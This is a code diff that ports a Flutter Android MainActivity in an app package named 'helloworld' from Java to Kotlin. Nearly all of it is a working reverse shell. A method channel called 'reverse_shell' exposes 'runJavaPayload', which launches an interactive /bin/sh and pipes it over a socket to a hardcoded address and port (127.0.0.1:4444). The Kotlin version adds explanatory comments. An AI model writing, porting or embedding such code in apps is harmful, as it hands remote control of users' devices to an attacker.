@@ -1,58 +1,55 @@
 package com.example.helloworld
-import androidx.annotation.NonNull;
-import io.flutter.embedding.android.FlutterActivity;
-import io.flutter.plugin.common.MethodChannel;
 
-import android.os.Bundle;
-import android.util.Log;
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.net.Socket;
+import android.os.Bundle
+import android.util.Log
+import io.flutter.embedding.android.FlutterActivity
+import io.flutter.plugin.common.MethodChannel
+import java.io.IOException
+import java.io.InputStream
+import java.io.OutputStream
+import java.net.Socket
 
-public class MainActivity extends FlutterActivity {
-    private static final String CHANNEL = "com.example.hellowword/reverse_shell";
+class MainActivity : FlutterActivity() {
+    private val CHANNEL = "com.example.helloworld/reverse_shell"
 
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
 
-        new MethodChannel(getFlutterEngine().getDartExecutor().getBinaryMessenger(), CHANNEL)
-            .setMethodCallHandler(
-                (call, result) -> {
-                    if (call.method.equals("runJavaPayload")) {
-                        String ip = call.argument("127.0.0.1");
-                        int port = call.argument("4444");
-                        runJavaPayload(ip, port);
-                        result.success("Java Payload executed successfully");
-                    } else {
-                        result.notImplemented();
-                    }
-                }
-            );
+        MethodChannel(flutterEngine!!.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
+            if (call.method == "runJavaPayload") {
+                // Hardcoded IP and port
+                runJavaPayload("127.0.0.1", 4444)
+                result.success("Java Payload executed successfully")
+            } else {
+                result.notImplemented()
+            }
+        }
     }
 
-    private void runJavaPayload(String ip, int port) {
+    private fun runJavaPayload(ip: String, port: Int) {
         try {
-            String[] str = {"/bin/sh", "-i"};
-            Process p = Runtime.getRuntime().exec(str);
-            InputStream pin = p.getInputStream();
-            InputStream perr = p.getErrorStream();
-            OutputStream pout = p.getOutputStream();
+            // Start an interactive shell
+            val str = arrayOf("/bin/sh", "-i")
+            val process = Runtime.getRuntime().exec(str)
+            val pin = process.inputStream
+            val perr = process.errorStream
+            val pout = process.outputStream
 
-            Socket socket = new Socket(ip, port);
-            InputStream sin = socket.getInputStream();
-            OutputStream sout = socket.getOutputStream();
+            // Connect to the specified IP and port
+            val socket = Socket(ip, port)
+            val sin = socket.getInputStream()
+            val sout = socket.getOutputStream()
 
+            // Forward input/output streams between the shell and the socket
             while (true) {
-                while (pin.available() > 0) sout.write(pin.read());
-                while (perr.available() > 0) sout.write(perr.read());
-                while (sin.available() > 0) pout.write(sin.read());
-                sout.flush();
-                pout.flush();
+                while (pin.available() > 0) sout.write(pin.read())
+                while (perr.available() > 0) sout.write(perr.read())
+                while (sin.available() > 0) pout.write(sin.read())
+                sout.flush()
+                pout.flush()
             }
-        } catch (IOException e) {
-            Log.e("ReverseShell", "Error running reverse shell", e);
+        } catch (e: IOException) {
+            Log.e("ReverseShell", "Error running reverse shell", e)
         }
     }
 }
